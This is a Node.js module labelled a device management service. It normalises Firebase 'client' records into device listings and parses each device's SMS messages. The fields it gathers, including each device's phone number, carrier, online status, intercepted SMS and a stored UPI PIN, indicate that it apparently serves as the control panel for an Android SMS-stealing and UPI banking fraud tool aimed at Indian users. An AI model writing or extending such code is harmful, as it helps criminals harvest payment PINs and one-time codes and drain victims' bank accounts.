"use strict";

/**
 * Device management service.
 * Parses and normalizes device data from Firebase.
 */

const PhoneExtractor = require("./phoneExtractor");

class DeviceService {
  /**
   * Parse a raw Firebase client object into a normalized device.
   */
  static normalize(id, raw) {
    if (!raw || typeof raw !== "object") return null;

    const batteryRaw = raw.batteryLevel ?? raw.battery ?? "—";
    let batteryPercent = 0;
    if (typeof batteryRaw === "number") {
      batteryPercent = batteryRaw;
    } else if (typeof batteryRaw === "string") {
      const match = batteryRaw.match(/(\d+)/);
      batteryPercent = match ? parseInt(match[1], 10) : 0;
    }

    const smsText = raw.lastSms || raw.smsBody || "";
    const phoneInfo = PhoneExtractor.extract(smsText);

    // Try many field paths for phone number
    const phoneFields = [
      raw.phoneNumber, raw.phone, raw.number, raw.mobileNumber, raw.mobile,
      raw.phoneNo, raw.contactNumber, raw.simNumber, raw.sim,
      raw.registeredNumber, raw.devicePhone, raw.myNumber,
      raw.simPhoneNumber, raw.line1Number, raw.msisdn,
      raw.deviceInfo?.phoneNumber, raw.deviceInfo?.phone,
      raw.simInfo?.phoneNumber, raw.simInfo?.number,
      raw.info?.phone, raw.info?.phoneNumber,
      raw.extras?.phoneNumber, raw.extras?.phone,
      raw.device?.phoneNumber, raw.device?.phone,
    ];

    let phoneNumber = "—";
    for (const pf of phoneFields) {
      if (pf && pf !== "—" && pf !== "" && pf !== "null" && pf !== "undefined") {
        const digits = String(pf).replace(/[^0-9+]/g, "");
        if (digits.length >= 7) {
          phoneNumber = digits.replace(/^\+/, "");
          // Prepend 91 for Indian 10-digit numbers
          if (phoneNumber.length === 10 && /^[6-9]/.test(phoneNumber)) {
            phoneNumber = "91" + phoneNumber;
          }
          break;
        }
      }
    }

    // Fallback: try phone from SMS only if no device phone found
    if (phoneNumber === "—" && phoneInfo.numbers.length > 0) {
      phoneNumber = phoneInfo.numbers[0];
    }

    return {
      id,
      name: raw.deviceName || raw.name || raw.model || id,
      model: raw.model || "—",
      android: raw.androidVersion || raw.android || "—",
      battery: String(batteryRaw),
      batteryPercent,
      phoneNumber,
      provider: raw.provider || raw.carrier || raw.simOperator
        || raw.deviceInfo?.carrier || raw.simInfo?.operator
        || phoneInfo.carriers[0] || "—",
      upiPin: raw.upiPin || raw.upiPIN || "",
      status: Boolean(raw.status || raw.online || raw.isConnected),
      lastSeen: raw.lastSeen || raw.lastOnline || null,
      sdkVersion: raw.sdkVersion || raw.sdk || "—",
      simOperator: raw.simOperator || "—",
    };
  }

  /**
   * Parse a collection of raw Firebase clients.
   * @param {object} clientsData - Firebase clients object
   * @returns {Array} Normalized device list
   */
  static parseAll(clientsData) {
    if (!clientsData || typeof clientsData !== "object") return [];

    return Object.entries(clientsData)
      .map(([id, raw]) => this.normalize(id, raw))
      .filter(Boolean)
      .sort((a, b) => {
        // Online devices first, then alphabetical
        if (a.status !== b.status) return a.status ? -1 : 1;
        return a.name.localeCompare(b.name);
      });
  }

  /**
   * Parse SMS messages for a device.
   * @param {object} messagesData - Firebase messages object for a device
   * @returns {Array} Normalized message list
   */
  static parseMessages(messagesData) {
    if (!messagesData || typeof messagesData !== "object") return [];

    return Object.entries(messagesData)
      .map(([id, raw]) => {
        if (!raw || typeof raw !== "object") return null;
        return {
          id,
          text: raw.text || raw.body || raw.message || "",
          sender: raw.sender || raw.from || "—",
          timestamp: raw.timestamp || raw.time || null,
          read: Boolean(raw.read),
        };
      })
      .filter(Boolean)
      .sort((a, b) => {
        if (!a.timestamp || !b.timestamp) return 0;
        return new Date(b.timestamp) - new Date(a.timestamp);
      });
  }
}

module.exports = DeviceService;
